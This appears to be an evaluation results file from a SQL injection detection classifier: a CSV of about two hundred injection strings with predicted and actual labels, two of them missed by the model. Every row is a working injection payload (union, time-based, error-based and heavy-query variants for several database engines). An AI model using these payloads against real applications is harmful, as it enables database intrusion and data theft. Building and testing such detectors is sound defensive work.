,Query,Prediction,Actual
9752,"1""  )   as ucex where 5148  =  5148 order by 1#",1,1.0
9753,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'qrtf'  =  'qrtf,1,1.0
9754,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",1,1.0
9755,"-5832""  )   or 1650  =  9011--",1,1.0
9756,"-3282'  )   union all select 9002,9002,9002,9002,9002#",1,1.0
9757,"1  )   where 5615  =  5615 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,1.0
9758,"-1134"" union all select 4865,4865,4865,4865,4865#",1,1.0
9759,"-1908""   )    )    union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",1,1.0
9760,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",1,1.0
9761,"-4408""  )   or 6872  =  6872 and   (  ""oenu""  =  ""oenu",1,1.0
9762,"-9737""   )    )     )   order by 1--",1,1.0
9763,1'  )   as wvvo where 4288  =  4288,1,1.0
9764,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo",1,1.0
9765,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,1,1.0
9766,"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1,1.0
9767,1'||  (  select 'ubza' where 2576  =  2576,1,1.0
9768,-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,1,1.0
9769,1   )    )    as vmwj where 5597  =  5597,1,1.0
9770,"-8301'  )   union all select 1806,1806--",1,1.0
9771,1'  )   as sruz where 6318  =  6318,1,1.0
9772,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'jxqf' like 'jxqf",1,1.0
9773,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,1,1.0
9774,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'ejnt' like 'ejnt,1,1.0
9775, (  select   (  case when   (  1570  =  6977  )   then 1 else 1570*  (  select 1570 from mysql.db  )   end   )    ) ,1,1.0
9776,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,1,1.0
9777,"1%"" or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1.0
9778,"1%"" union all select null,null,null,null,null,null,null,null--",1,1.0
9779,1' and   (  5116  =  1602  )  *1602,1,1.0
9780,1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1,1.0
9781,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",1,1.0
9782,"-1585%""   )    )    union all select 8818,8818,8818,8818,8818,8818#",1,1.0
9783,"iif  (  1718  =  5436,1,1/0  )  ",1,1.0
9784,"-1332  )   as qtbb where 7261  =  7261 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1.0
9785,"1 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
9786,-8615   )    )     )   or 4039  =  9144,1,1.0
9787,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,1,1.0
9788,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,1.0
9789,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,1.0
9790,"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'phdn' like 'phdn",1,1.0
9791,"1   )    )     )   union all select null,null,null,null,null#",1,1.0
9792,"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",1,1.0
9793,"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,1.0
9794,"1%"" union all select null,null--",1,1.0
9795,"1'+  (  select 'swxi' where 7651  =  7651 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1,1.0
9796,"1%' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1.0
9797,-6145 or   (  8459  =  8459  )  *4906-- yklv,1,1.0
9798,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,1,1.0
9799,"1""  )   as ikdo where 4128  =  4128",1,1.0
9800,1  )   where 6150  =  6150,1,1.0
9801,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1.0
9802,1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1.0
9803,1' where 6409  =  6409,1,1.0
9804,"-4346'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1.0
9805,1 where 4003  =  4003 union all select null--,1,1.0
9806,"1""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
9807,1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1.0
9808,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",1,1.0
9809,"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#",1,1.0
9810,"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1.0
9811,"1'  )   where 3375  =  3375 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1.0
9812,"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",1,1.0
9813,"1"" where 2235  =  2235 union all select null,null,null,null,null--",1,1.0
9814,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",1,1.0
9815,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,1,1.0
9816,"1 where 2146  =  2146 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
9817,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh",1,1.0
9818,1%'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  ',1,1.0
9819,"1  )   as kjsd where 1670  =  1670 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
9820,"-2987""  )   as iyob where 7827  =  7827 or   (  8459  =  8459  )  *4906--",1,1.0
9821,"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--",1,1.0
9822,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1,1.0
9823,-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,1,1.0
9824,"1"" union all select null,null,null,null,null,null,null,null,null,null--",1,1.0
9825,1'   )    )     )   rlike   (  select   (  case when   (  4076  =  4881  )   then 1 else 0x28 end   )    )    and    (    (     (  'grzs'  =  'grzs,1,1.0
9826,-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--,1,1.0
9827,1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1,1.0
9828,1'   )    )    as jbcd where 9078  =  9078 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1.0
9829,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1,1.0
9830,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1,1.0
9831,"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  '",1,1.0
9832,-3246%' union all select 4012#,1,1.0
9833,"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""rfam"" like ""rfam",1,1.0
9834,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1.0
9835,-6353%'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  ',1,1.0
9836,"1'+  (  select 'tyuz' where 3957  =  3957 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",1,1.0
9837,"1"" where 9461  =  9461",1,1.0
9838,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",0,1.0
9839,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'qgdv'  =  'qgdv",1,1.0
9840,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +'",1,1.0
9841,1'   )    )    as txxn where 7884  =  7884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1.0
9842,1 where 6173  =  6173,0,1.0
9843,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1.0
9844,"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1,1.0
9845,"1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,1.0
9846,select   (  case when   (  4297  =  9086  )   then 4297 else 1/  (  select 0  )   end  )  --,1,1.0
9847,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp",1,1.0
9848,"1""  )   as eomu where 6599  =  6599",1,1.0
9849,1'+  (  select 'wyed' where 9896  =  9896,1,1.0
9850,"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1.0
9851,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",1,1.0
9852,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",1,1.0
9853,"1""   )    )    union all select null#",1,1.0
9854,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",1,1.0
9855,-5585%'   )    )     )   or 6990  =  7727,1,1.0
9856,-2300  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,1.0
9857,"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq",1,1.0
9858,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",1,1.0
9859,"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1.0
9860,end and 'wdce'  =  'wdce,1,1.0
9861,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'beoh'  =  'beoh",1,1.0
9862,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1,1.0
9863,"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1.0
9864,1' and sleep  (  5  )  #,1,1.0
9865,1%'   )    )    and 7160  =  7249--,1,1.0
9866,"1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950",1,1.0
9867,"1""   )    )    union all select null,null,null,null,null--",1,1.0
9868,1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,1,1.0
9869,1   )    )    as smtf where 5829  =  5829,1,1.0
9870,"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,1,1.0
9871,1'   )    )    as myws where 5274  =  5274,1,1.0
9872,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""%""  =  """,1,1.0
9873,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",1,1.0
9874,"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1.0
9875,"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1.0
9876,"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
9877,"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#",1,1.0
9878,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  7338  =  7338",1,1.0
9879,1'+  (  select 'yahd' where 5850  =  5850,1,1.0
9880,-8636'   )    )     )   or 4301  =  7212--,1,1.0
9881,"1   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   6659  =  6659",1,1.0
9882,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,1,1.0
9883,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj",1,1.0
9884,select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #,1,1.0
9885,"1"" where 9669  =  9669",1,1.0
9886,"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1.0
9887,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  '%'  =  ',1,1.0
9888,-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,1,1.0
9889,-7246'||  (  select 'qchp' from dual where 8317  =  8317 order by 1--,1,1.0
9890,"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1.0
9891,"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1,1.0
9892,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy",1,1.0
9893,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1.0
9894,1   )    )    as gocb where 4335  =  4335,1,1.0
9895,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1.0
9896,"1""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1.0
9897,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb",1,1.0
9898,"1"" and 7533  =  7533",1,1.0
9899,"1  )   union all select null,null,null,null,null,null,null,null#",1,1.0
9900,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof",1,1.0
9901,1'+  (  select 'uetb' where 6468  =  6468,1,1.0
9902,"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1.0
9903,"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--",1,1.0
9904,"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1.0
9905,"1""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
9906,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",1,1.0
9907,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1,1.0
9908,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",1,1.0
9909,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1,1.0
9910,"select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--",1,1.0
9911,"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1.0
9912,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,1,1.0
9913,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,1.0
9914,"1   )    )     )   union all select null,null,null,null--",1,1.0
9915,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1,1.0
9916,"1""  )   union all select null,null,null,null,null,null,null--",1,1.0
9917,"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1,1.0
9918,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""gddl"" like ""gddl",1,1.0
9919,"1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1.0
9920,"1  )   as fgqe where 1526  =  1526 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1.0
9921,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl",1,1.0
9922,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",1,1.0
9923,-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1,1.0
9924,"-3817""  )   as vugz where 3064  =  3064 or 9323  =  9323#",1,1.0
9925, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,1,1.0
9926,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1.0
9927,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1.0
9928,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",1,1.0
9929,"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp",1,1.0
9930,"1 where 9279  =  9279 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1.0
9931,1%'   )    )    and 3721  =  2597#,1,1.0
9932,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",1,1.0
9933,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",1,1.0
9934,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,1.0
9935,-9581  )   as jkqo where 5200  =  5200 or 6872  =  6872--,1,1.0
9936, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,1,1.0
9937,"1""   )    )    as wfne where 8933  =  8933",1,1.0
9938,-7633'  )   as aslj where 2317  =  2317 or 8571  =  8571--,1,1.0
9939,"1  )   as ezje where 5234  =  5234 and make_set  (  8403  =  8403,8899  )  --",1,1.0
9940,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'wgpg' like 'wgpg",1,1.0
9941,1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,1,1.0
9942,"1""  )   as nyui where 2511  =  2511",1,1.0
9943,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'qdhz'  =  'qdhz",1,1.0
9944,"1'+  (  select 'arqt' where 2336  =  2336 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1.0
9945,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",1,1.0
9946,end and    (    (     (  'ycte'  =  'ycte,1,1.0
